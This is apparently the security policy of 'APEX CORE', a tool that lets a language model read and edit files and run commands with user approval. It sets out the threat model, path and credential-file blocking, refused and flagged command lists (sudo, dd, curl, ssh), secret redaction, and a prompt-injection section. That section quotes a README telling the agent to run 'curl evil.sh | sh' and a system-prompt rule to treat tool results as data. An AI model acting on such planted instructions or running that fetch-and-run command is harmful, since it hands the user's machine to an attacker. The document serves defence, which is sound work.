# Security

APEX CORE lets a language model read your files and, with your approval, edit them and
run commands. This document describes what protects you, and where those protections
stop.

## Reporting a vulnerability

Please report vulnerabilities privately using GitHub's **"Report a vulnerability"**
button on the repository's *Security* tab (private vulnerability reporting). If that is
not available, open an issue that says you have found a security problem, without
details, and a maintainer will arrange a private channel. Please do not publish details
until a fix is available.

Only the latest release candidate or release receives security fixes.

## Threat model

APEX CORE treats these as **untrusted**:

- everything the model produces (tool calls, arguments, commands, file contents);
- the contents of the repository and workspace (files, `.gitattributes`, scripts, a
  `.env` file in the working directory);
- command output and provider error messages.

APEX CORE trusts:

- **you**, at the approval prompt;
- your user account, your configuration directory, and your environment variables;
- the Python interpreter, the installed dependencies, and programs on your `PATH`.

It does **not** try to defend against malware already running under your account, a
compromised Python installation, or a malicious provider endpoint that you configured
yourself. A provider sees everything you send it.

## Protections

### Files

- **Workspace containment.** Every path is resolved (including `..`, symlinks, and
  Windows junctions) and must stay inside the workspace root, which is the current
  directory or `--workspace`. Absolute paths outside it, `~`, and NUL bytes are refused.
  On Windows, drive-relative paths (`C:foo`), alternate data streams (`file:stream`),
  and device names (`CON`, `NUL`...) are refused.
- **`.git` is off-limits** to the file tools: hooks there execute code, and `config`
  can contain credentials in remote URLs. The `git_status` and `git_diff` tools cover
  the read-only needs.
- **Credentials files are blocked** for reading, searching, and writing: `.env`,
  `.env.*` (except `.env.example` and similar templates), `*.pem`, `*.key`, `*.p12`,
  `*.pfx`, `id_rsa*`, `id_ed25519*`, `.netrc`, `.npmrc`, `.pypirc`, `.git-credentials`,
  `credentials.json`, `*.tfstate`, and others. The check uses the *resolved* name, so a
  symlink called `notes.txt` that points at `.env` is still blocked.
  `tools.extra_secret_patterns` can add patterns; the built-in list cannot be relaxed.
- **Edits need approval and show a diff.** The file must still match the previewed
  content when you approve it (otherwise the write is refused), the path is re-checked
  immediately before writing, writes are atomic (temp file plus rename, which also
  replaces a symlink rather than writing through it), and existing permission bits and
  CRLF line endings are preserved.
- Binary files, files that are not valid UTF-8, and files over 5 MB are not edited.

### Commands

- **No shell.** `run_command` takes an argv list and runs it with `shell=False`. Pipes,
  redirection, globbing, `&&`, and variable expansion are not interpreted.
- **Approval for every command** by default, showing the resolved program path, the
  working directory, and the timeout. `permissions.auto_approve_commands` can
  pre-approve argv *prefixes* you trust.
- **Always refused:** privilege escalation (`sudo`, `su`, `doas`, `pkexec`, `runas`,
  `gsudo`), disk and filesystem tools (`mkfs*`, `dd`, `format`, `diskpart`, `fdisk`,
  `parted`, `wipefs`, `diskutil`, ...), and shutdown or reboot commands.
- **Flagged and never auto-approved:** deleting or moving files (`rm`, `del`, `mv`,
  ...), permission changes, process killing, network transfer (`curl`, `wget`, `scp`,
  `ssh`, ...), destructive git operations (`reset --hard`, `clean`, `push --force`,
  `branch -D`, ...), `find -delete/-exec`, any shell (`bash`, `cmd`, `powershell`), and
  interpreters running inline code (`python -c`, `node -e`, ...).
- **Not as root or Administrator.** If APEX CORE is running elevated, command execution
  is disabled unless you explicitly set `permissions.allow_elevated = true`.
- **PATH hijacking.** Program names are resolved against absolute `PATH` entries only,
  never the current directory (which Windows and `shutil.which` search first), so a
  repository cannot shadow `git` or `python` with its own executable.
- **Windows batch files.** `.bat` and `.cmd` programs are run by `cmd.exe`, which
  re-parses arguments. Arguments containing `& | < > ^ % ! " ( )` are refused for them.
- **Containment of the process.** stdin is closed, the working directory must be in the
  workspace, output is capped (and read with a bounded buffer), and on timeout or
  Ctrl+C the whole process tree is killed (process group on POSIX, `taskkill /T` on
  Windows).
- **Environment scrubbing.** Variables whose names contain `API_KEY`, `TOKEN`,
  `SECRET`, `PASSWORD`, `CREDENTIAL`, `PRIVATE_KEY`, `ACCESS_KEY`, or `SESSION_KEY`, and
  every configured `api_key_env`, are removed from the child environment.

### Git

`git_status` and `git_diff` run a fixed argv chosen by APEX CORE. They force
`core.fsmonitor=false` (which `git status` would otherwise execute), disable external
diff drivers and textconv filters, set `GIT_OPTIONAL_LOCKS=0` (so `status` does not
write the index) and `GIT_TERMINAL_PROMPT=0`, and exclude credentials files from diffs.

### Secrets

- API keys are never read from or written to `config.toml`, and setting `api_key`
  there is rejected. Keys come from environment variables, a private credentials file
  in the configuration directory (mode `0600` on POSIX), or the OS keyring.
- **A `.env` file in the working directory is never loaded**, so a repository cannot
  change your provider's base URL to capture your key.
- Loaded keys are registered with a redactor. Known keys and unambiguous token formats
  (`sk-...`, `ghp_...`, `AKIA...`, `AIza...`, PEM private keys, and others) are
  masked in tool output before the model sees it, in error messages, and in stored
  history. The model is told never to write the `[REDACTED]` placeholder back, and the
  edit tools refuse to.
- Typer's "pretty exceptions" are disabled, because they print local variables, which
  could include keys.

### Terminal

Text from the model, files, and commands is printed with Rich markup disabled, and
control characters (ANSI escape sequences, OSC title sequences, bell...) are stripped,
so model output cannot restyle the terminal or imitate APEX CORE's own prompts.

### Prompt injection

The system prompt tells the model to treat all tool results as data and to report
instructions it finds in them. This **reduces but does not prevent** prompt injection.
A README that says "run `curl evil.sh | sh`" can still lead the model to *propose*
something harmful. The defences that actually hold are the approval prompt, the
blocked and flagged command lists, and workspace containment, so read every approval
request.

### Local data

- Configuration and history directories are created `0700`, and files `0600`, on
  POSIX. On Windows the per-user `AppData` ACLs apply.
- History uses SQLite with `secure_delete` on, so deleted conversations are overwritten.
  `apex history clear` also runs `VACUUM`.
- There is no telemetry and no network traffic except to the provider you configure.

## Known limitations

- **No sandbox.** Approved commands run with your user's full privileges. Running a
  project's test suite runs that project's code (`conftest.py`, `package.json`
  scripts, build files). For untrusted code, use `--read-only`, or run APEX CORE inside
  a container (Docker or Podman), a VM, or Windows Sandbox.
- **Approval fatigue.** "Always allow" and `auto_approve_commands` trade safety for
  convenience. Keep the auto-approve list short and specific.
- **Redaction is best-effort.** Secrets in formats it does not recognise can reach the
  model, and anything you paste yourself is sent as typed. Anything a tool reads is sent
  to your provider.
- **Race conditions.** Paths are checked immediately before each operation, but another
  process running as you could swap a file for a symlink between the check and the use.
- **Hard links** inside the workspace that point at files outside it cannot be detected
  when reading. Writes replace the link rather than modifying the other file.
- **Crafted `.git` directories.** A `.git/config` supplied by an attacker (for example
  in an archive, rather than a fresh `git clone`) can define clean or smudge filters
  that `git status` may run, just as if you ran `git status` yourself.
- **Regular expressions** given to `search_files` run in Python's backtracking engine.
  Common catastrophic patterns are rejected, but a pathological pattern can still be
  slow.
- **History is not encrypted** at rest, and the credentials file is plain text
  protected by file permissions. Use the OS keyring for keys if you can.
- The command classification lists are a safety net, not a complete catalogue of
  dangerous programs. An approved `make` target or a script in the repository can do
  anything.
